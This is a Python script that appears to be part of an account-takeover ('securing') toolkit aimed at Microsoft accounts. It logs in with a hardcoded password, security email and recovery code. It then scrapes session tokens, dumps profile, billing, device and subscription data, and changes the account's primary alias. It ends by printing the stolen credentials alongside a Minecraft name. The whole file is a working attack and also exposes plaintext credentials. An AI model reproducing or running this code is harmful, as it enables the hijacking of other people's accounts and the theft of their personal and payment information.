"""Probe OGI APIs + primary alias on the dashboard account."""
from __future__ import annotations

import asyncio
import json
import logging
import re
import uuid

logging.basicConfig(level=logging.INFO, format="%(levelname)s %(name)s: %(message)s")

from database.database import DBConnection
from securing.auth.handle_redirects import get_data, handle_redirects
from securing.auth.initial_session import get_session
from securing.auth.polish_host import polish_host
from securing.utils.cookies.get_amc import get_amc, scrape_token
from securing.utils.cookies.get_cookies import get_cookies
from securing.utils.cookies.get_livedata import livedata
from securing.utils.cookies.safe_cookies import has_cookie
from securing.utils.login_pwd import login_pwd
from securing.utils.ogi.get_devices import get_devices
from securing.utils.ogi.get_owner_info import get_owner_info
from securing.utils.ogi.get_subscriptions import get_subscriptions
from securing.utils.proxy import close_session
from securing.utils.security.change_primary_alias import (
    _get_manage,
    change_primary_alias,
)
from securing.utils.security_information import _page_id

EMAIL = "noloveyahXdgW23@outlook.com"
PWD = "ApS96aYMYTDcxj"
SEC = "3d53d15d899345f7@ilovevbucks.site"
RC = "RUF68-6DNF2-WLHM4-A4JW5-AEG3G"


async def dump_raw(session, name, url, token=None):
    headers = {
        "Accept": "application/json, text/plain, */*",
        "X-Requested-With": "XMLHttpRequest",
    }
    if token:
        headers["__RequestVerificationToken"] = token
    r = await session.get(url, headers=headers, follow_redirects=True)
    body = (r.text or "")[:500]
    print(f"\n=== {name} status={r.status_code} url={r.url} ===")
    print(body)
    try:
        data = r.json()
        print("json keys:", list(data.keys())[:20] if isinstance(data, dict) else type(data))
        return data
    except Exception as e:
        print("json fail", e)
        return None


async def main():
    with DBConnection() as db:
        try:
            db.add_security_email(SEC, PWD)
        except Exception as e:
            print("sec email", e)

    session = get_session()
    try:
        live = await livedata(session)
        page = await login_pwd(session, EMAIL, live["urlPost"], PWD, live["ppft"])
        msa = get_data(page)
        if not msa:
            h = await handle_redirects(session, page)
            if isinstance(h, dict) and h.get("urlPost"):
                msa = h
            elif isinstance(h, str):
                msa = get_data(h)
        if not msa or not msa.get("urlPost"):
            if has_cookie(session, "__Host-MSAAUTH") or has_cookie(session, "MSPAuth"):
                msa = {"_cookies_only": True}
            else:
                print("LOGIN FAIL", _page_id(page), (page or "")[:300])
                return
        await polish_host(session, msa)
        print("logged in + polished")

        # --- AMC tokens ---
        try:
            tokens = await get_amc(session)
            print("tokens", {k: (v[:40] + "...") if v else None for k, v in tokens.items()})
        except Exception as e:
            print("get_amc FAILED", e)
            tokens = {"home": None, "profile": None, "devices": None}

        # Raw personal-info WITH and WITHOUT token (dona uses no token)
        await dump_raw(
            session,
            "personal-info NO token",
            "https://account.microsoft.com/profile/api/v1/personal-info",
        )
        await dump_raw(
            session,
            "personal-info WITH profile token",
            "https://account.microsoft.com/profile/api/v1/personal-info",
            tokens.get("profile"),
        )
        await dump_raw(
            session,
            "personal-info WITH home token",
            "https://account.microsoft.com/profile/api/v1/personal-info",
            tokens.get("home"),
        )

        # Check what page we land on for profile scrape
        for url in (
            "https://account.microsoft.com/",
            "https://account.microsoft.com/profile?lang=en-US",
            "https://account.microsoft.com/profile/about?ru=https%3A%2F%2Faccount.microsoft.com%2Fprofile",
            "https://account.microsoft.com/billing/payments",
            "https://account.microsoft.com/devices/",
        ):
            r = await session.get(url, follow_redirects=True)
            tok = re.search(
                r'name="__RequestVerificationToken"[^>]*value="([^"]+)"',
                r.text or "",
            )
            title = re.search(r"<title[^>]*>(.*?)</title>", r.text or "", re.I | re.S)
            print(
                f"PAGE {url[:60]} -> {r.url} status={r.status_code} "
                f"token={bool(tok)} title={(title.group(1).strip()[:40] if title else None)!r}"
            )

        # Current helpers
        if tokens.get("profile"):
            oi = await get_owner_info(session, tokens["profile"])
            print("\nget_owner_info =>", json.dumps(oi, default=str)[:600])
        if tokens.get("home"):
            subs = await get_subscriptions(session, tokens["home"])
            print("\nget_subscriptions =>", json.dumps(subs, default=str)[:600])
            devs = await get_devices(session, tokens["home"])
            print("\nget_devices =>", json.dumps(devs, default=str)[:600])

        # --- Primary alias ---
        html, canary, emails = await _get_manage(session)
        print("\nmanage pre", _page_id(html), bool(canary), emails[:8])
        api = await get_cookies(session)
        local = f"sunny{uuid.uuid4().hex[:12]}"
        ok = await change_primary_alias(
            session,
            local,
            api,
            security_email=SEC,
            account_email=EMAIL,
            password=PWD,
        )
        _, _, after = await _get_manage(session)
        print("PRIMARY_OK", ok, f"{local}@outlook.com")
        print("after aliases", after)
        print("\n=== CREDS ===")
        print("original", EMAIL)
        print("primary", f"{local}@outlook.com" if ok else EMAIL)
        print("security", SEC)
        print("password", PWD)
        print("recovery", RC)
        print("mc NalanTheGoat")
    finally:
        await close_session(session)


if __name__ == "__main__":
    asyncio.run(main())
